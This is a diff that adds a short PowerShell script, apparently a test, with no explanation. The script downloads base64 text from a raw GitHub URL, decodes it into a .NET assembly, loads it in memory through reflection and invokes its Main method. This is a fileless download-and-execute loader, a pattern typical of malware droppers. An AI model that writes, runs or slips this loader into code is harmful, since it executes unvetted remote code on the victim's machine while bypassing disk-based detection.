@@ -1,0 +1,5 @@
+$data=(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/naman2341/testrepo/refs/heads/main/test.txt")
+$bytes = [System.Convert]::FromBase64String($data)
+$assembly = [System.Reflection.Assembly]::Load($bytes) 
+$entryPointMethod = $assembly.GetTypes().Where({ $_.Name -eq 'Program' }, 'First').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic')
+$entryPointMethod.Invoke($null, (, [string[]] ('help')))
